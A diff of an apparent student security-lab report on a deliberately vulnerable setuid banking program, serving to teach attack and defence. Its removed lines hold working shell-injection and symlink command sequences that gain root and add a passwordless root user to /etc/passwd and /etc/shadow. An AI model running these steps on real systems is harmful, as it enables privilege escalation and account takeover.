@@ -21,169 +21,90 @@ Impact d:
 
 --------------------------------------------------------------------
                               ISSUE 1
-Vulnerability: Usernames are identified through the USER environment variable. The hacker can set USER to run malicious code as root when the program reports on the account using setuid(0) and system(). 
-
-This is easy to impersonate since it can be changed from the shell
-If the password is compromised, it is trivial for a hacker to impersonate the user to gain control of the account.
+Vulnerability: We are about to gain root priviledges by exploiting 3 main problems with this code. First, usernames are identified through the USER environment variable and hacker can set USER to try to run malicious code when system(buffer) is called in report(user). Secondly, the system() call is made by root because it follows setuid(0). This allows a hacker to run malicious code as root. Lastly, the program does not check if any of the files it is working with are symbolic links. If a hacker is able to escalate to run root commands, they can link the password file (which the hacker can control the output of) to /etc/passwd and /etc/shadow to create and modify users.
 
 
-$USER="; chmod -R 7777 ."
-$./account ''
+I wrote e1 which executes all of the following exploits in order.
 
-$USER="; mv passwords passwords.BAK"
-$./account ''
 
-$ln -s /etc/passwd passwords
-$USER="; chown root:root passwords"
-$./account ''
-
-$USER="froot:x:0:0:/root:/bin/bash"
-$./account ''
-
-$USER="; rm -f passwords"
-$./account ''
-
-$ln -s /etc/shadow passwords
-$USER="; chown root:root passwords"
-$./account ''
-
-$USER="froot::::::::"
-$./account ''
-
-$USER="; mv passwords.BAK passwords"
-$./account ''
-restart the VM
-
-SYSTEM
-
-Exploit a: 
+Exploit a: The buffer is system(buffer) is "cat /vulnerable/accounts/"  plus the string from $USER. The hacker can set USER="; chmod -R 7777 ." so the cat call is ended (we don't care if it fails) then we run our malicious code. In this case we escalated all priviledges.
 Impact a: Allows the hacker perform priviledge escalation. 
 
-Exploit c: 
-Impact c: Allows the hacker to add a root user to /etc/passwd
+Exploit b: Write froot user to passwd. 
 
-Exploit d: 
-Impact d: Allows the hacker to add a root user to /etc/shadow
+First, backup the passwords file so we can restore them afterwards. This way the hacker gains the info but the user thinks that everything is running as usual since their account is setup and usable.
+Next, make a symbolic link from passwords to /etc/passwd. Then the hacker sets USER="froot:x:0:0:/root:/bin/bash" to create a new root user. The x denotes that the password hash is in /etc/shadow
+Impact b: Allows the hacker to add a root user to /etc/passwd
 
-Exploit e: 
-Impact e: Allows the user to delete files needed for the progam
+Exploit c: Write froot user to passwd. This uses the exact same approach as b) but we set USER="froot::::::::" to say that there is no password. Alternatively, we could also look at the contents of /etc/shadow and set the froot password hash to be the same as hacker's password hash. At this point, we also would notice that root hash the same password hash as hacker. We could easily login as root at this point. If we want to login as our newly created froot user, restart then login.
+Impact c: Allows the hacker to add a root user to /etc/shadow
 
-Exploit b:
-Impact b: Allows the hacker to own the symbolic link  
-
-...
 
 --------------------------------------------------------------------
                               ISSUE 2
-Vulnerability: By using negative number (using the minus "-" sign) but not by using integer overflow.
+Vulnerability: There are several different ways that we can take advantage of unsecure transfers in this program.
 
-$USER=num1
-$./account pw1
-$USER=num2
-$./account pw2
-$./account pw2 num1 -100
+Exploit a: By using negative number (using the minus "-" sign), we can transfer money from another account. Effectively we can rob other accounts and there is no limit to how much we can take because the other account balance is not check before transferring since it assumes that they are only recieving money.
+Impact a: We gain limitless money and cause other account to fall deeply in debt.
 
-Exploit a: 
-Impact a:
+Exploit b: We can transfer money to our own account but the money is only added to our account, not taken away. We can only transfer as much as our account holds though, so we start small (99) and increase.
+Impact b: We gain limitless money
 
-There are also no lower limits on accounts, people can take far more money than is in the account.
+Exploit c: Using malicious code from Issue 1, we could also just append 0s (or any digit) to the end of our account file, which saves our balance. 
+Impact c: We gain limitless money.
 
-$USER=num1
-$./account pw1
-$./account pw1 99 num1
-$./account pw1 198 num1
-$./account pw1 396 num1
-
-
-Exploit b: 
-Impact b:
-
-Exploit c: 
-Impact c
-
-Exploit d: 
-Impact d:
-
-...
+Exploit d: Another issue related to money, is that transfers are limit to 2147483646 (long int max) but the user is told that they do not have sufficient credits.
+Impact d: Transfers 
 
 --------------------------------------------------------------------
                               ISSUE 3
-Vulnerability: If /vulnerable/passwords is a symbolic link, then the username and password can be written to the linked file. The hacker could even create a password backup beforehand then add the user/pw to the backup file. This way the hacker gains the info but the user thinks that everything is running as usual since their account is setup and usable. 
+Vulnerability: Depending on the permissions on accounts, (if set using chmod 755) users can easily view everyones balance.
 
-
-
-$touch ps
-
-$ln -s ps passwords
-$USER="; chown root:root passwords"
-$./account ''
-
-$cat ps
-
-Exploit a: 
-Impact a:
-
-Exploit b: 
-Impact b:
-
-Exploit c: 
-Impact c
-
-Exploit d: 
-Impact d:
-
-...
+Exploit a: Nothing special. Just read the files in accounts. This would be very easy for a regular user to figure out.
+Impact a: There is no privacy for the account balance, even from the weakest of hackers.
 
 --------------------------------------------------------------------
                               ISSUE 4
-Vulnerability: The accounts directory, and all the contents, are able to read by any other user.
+Vulnerability: There are many ways that a user can break the program just by setting their username to certain strings.
 
-Exploit a: 
-Impact a:
+Exploit a: Since the usernames are treated as directories in accounts, we can create 2 different strings that will point to the same account (u1, ./u1).
+Impact a: Multiple users can share the same account (without intending to).
 
-Exploit b: 
-Impact b:
+Exploit b: Since the username is used to "cat" the account file, a space in the username causes "cat" to look for multiple files (seperated by spaces).
+Impact b: The user with spaces cannot access their account to make transfers or view the contents.
 
-Exploit c: 
-Impact c
+Exploit c: Usernames that are larger than 99 character can cause the program to crash.
+Impact c: Users cannot access their accounts in any way (besides, possible directly viewing accounts/* if chmod 755 is run in setup.bash).
 
-Exploit d: 
-Impact d:
+Exploit d: An empty username.
+Impact d: Causes the program to seg fault
+
+Exploit e: Special characters in the username.
+Impact e: Multiple users can share the same account (without intending to).
+
+Exploit f: hacker can overwrite the password file. This uses mailicous code similar to Issue 1. hacker can find all of the usernames by running "ls accounts".
+Impact f: hacker can take control of accounts.
+
+Exploit g: By using usernames that refer to files that are critical for this program, hacker can create undesired effects. g) h) and i) all fall under this category. Set USER=../log
+Impact g: No file is created in accounts and the contents of the log file are mixed with what should've been the acount balance.
+
+Exploit h: Set USER=../passwords
+Impact h: No file is created in accounts and the password file contains what should've been in the acount balance.
+
+Exploit i: Set USER=../account
+Impact i: Causes the program to seg fault on the first try. The second time, it prints the contents of account executable
 
 ...
 
 --------------------------------------------------------------------
                               ISSUE 5
-Vulnerability: The accounts directory, and all the contents, are able to read by any other user.
+Vulnerability: There are several ways that a user can break the program just by setting their password to certain strings.
 
-Exploit a: 
-Impact a:
+Exploit a: Passwords with spaces causes the authentication process to be incorrect.
+Impact a: Users are able to make an account but cannot access it with the password they set. Instead, they could use the first word in their password.
 
-Exploit b: 
-Impact b:
-
-Exploit c: 
-Impact c
-
-Exploit d: 
-Impact d:
-
-...
-
---------------------------------------------------------------------
-
-				.
-				.
-				.
-
-
-Transfers can go to yourself for infinite money
-
-Undefined behaviour when atio is given bad input
-
-Race conditions when writing to file. Multiple users could access log or passwords concurrently
-
-
+Exploit b: Passwords with over 99 characters are cut off. The program only stores the first 99 character so someone could login with a different password than what was set.
+Impact b: The authentication process is compromised as distinct passwords will work on the same account (without intending to).
 
 
 
@@ -196,159 +117,3 @@ err(2, "file size");
 if ((fd=open(“/some_dir/some_file”, O_RDONLY)) == -1) {
 err(3, "open - %s",argv[1]);
 }
-
-
-
-Overlapping names
-
-[hacker@rh72 vulnerable]$ USER=u1
-[hacker@rh72 vulnerable]$ ./account p1
-Your account has:
-100
-[hacker@rh72 vulnerable]$ USER=./u1
-[hacker@rh72 vulnerable]$ ./account p2
-Your account has:
-100
-
-
-Names with spaces
-
-[hacker@rh72 vulnerable]$ USER="u1 u2"
-[hacker@rh72 vulnerable]$ ./account p2
-Your account has:
-100cat: u2: No such file or directory
-
-
-Everyone can read accounts
-
-[hacker@rh72 vulnerable]$ USER=u1
-[hacker@rh72 vulnerable]$ ./account p1
-Your account has:
-100
-[hacker@rh72 vulnerable]$ cd accounts
-[hacker@rh72 vulnerable]$ USER=u2
-[hacker@rh72 accounts]$ cat u1    
-
-
-
-
-
-Bad password
-
-[hacker@rh72 vulnerable]$ USER=u1
-[hacker@rh72 vulnerable]$ ./account ''
-Your account has:
-100
-[hacker@rh72 vulnerable]$ ./account ''
-You have not been authenticated
-
-Bad username
-
-[hacker@rh72 vulnerable]$ USER=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-[hacker@rh72 vulnerable]$ ./account p1 
-Your account has:
-sh: -c: line 1: syntax error near unexpected token `/vulnerable/accounts/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����X���q���(�'
-sh: -c: line 1: `cat /vulnerable/accounts/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����X���q���(�����5@'
-
-
-
-
-[hacker@rh72 vulnerable]$ USER=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
-[hacker@rh72 vulnerable]$ ./account p1
-Your account has:
-sh: -c: line 1: syntax error near unexpected token `/vulnerable/accounts/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC����X���q���(�'
-sh: -c: line 1: `cat /vulnerable/accounts/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC����X���q���(�����5@'
-
-[hacker@rh72 vulnerable]$ USER=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
-[hacker@rh72 vulnerable]$ ./account p2
-Segmentation fault
-
-
-
-
-
-[hacker@rh72 vulnerable]$ USER=u1
-[hacker@rh72 vulnerable]$ ./account ' p1 p2 '
-Your account has:
-100
-[hacker@rh72 vulnerable]$ ./account ' p1 p2 '
-You have not been authenticated
-
-
-
-If the permissions for accounts is set using 755 then all users can directly view everyones account history by using cat. No authentication is used. 
-
-If the permissions are set using 700 then users cannot directly view each others accounts. They can only view accounts whose credentials then know.
-
-
-[hacker@rh72 vulnerable]$ USER=
-[hacker@rh72 vulnerable]$ ./account p1
-Segmentation fault
-
-
-
-[hacker@rh72 vulnerable]$ USER='\n'
-[hacker@rh72 vulnerable]$ ./account p1
-Your account has:
-cat: /vulnerable/accounts/n: No such file or directory
-
-
-
-
-
-[hacker@rh72 vulnerable]$ ls accounts 
-u1 
-[hacker@rh72 vulnerable]$ USER="; echo 'u1 p2'>passwords"
-[hacker@rh72 vulnerable]$ ./account ''
-Your account has:
-cat: /vulnerable/accounts/: Is a directory
-[hacker@rh72 vulnerable]$ USER="u1"
-[hacker@rh72 vulnerable]$ ./account p2
-Your account has:
-100
-
-
-
-[hacker@rh72 vulnerable]$ USER=../log
-[hacker@rh72 vulnerable]$ ./account p1
-Your account has:
-100
-[root@rh72 vulnerable]# cat log 
-100../log: p1 
-[root@rh72 vulnerable]# ls accounts/
-
-
-[hacker@rh72 vulnerable]$ USER=../passwords
-[hacker@rh72 vulnerable]$ ./account p1
-Your account has:
-100
-[root@rh72 vulnerable]# cat passwords 
-100
-[hacker@rh72 vulnerable]# ls accounts/
-
-
-[hacker@rh72 vulnerable]$ USER=../new
-[hacker@rh72 vulnerable]$ ./account p
-Your account has:
-100
-[hacker@rh72 vulnerable]# ls -la new 
--rw-rw-r--    1 root     root            3 Oct 11 10:30 new
-[hacker@rh72 vulnerable]# ls -la accounts
-total 8
-drwxr-xr-x    2 root     root         4096 Oct 11 10:29 .
-drwxr-xr-x    4 748      705          4096 Oct 11 10:30 ..
-
-
-
-[hacker@rh72 vulnerable]$ USER=../account
-[hacker@rh72 vulnerable]$ ./account p1
-Segmentation fault
-
-
-
-[hacker@rh72 vulnerable]$ USER=../account.c
-[hacker@rh72 vulnerable]$ ./account p1
-Your account has:
-100
-
-
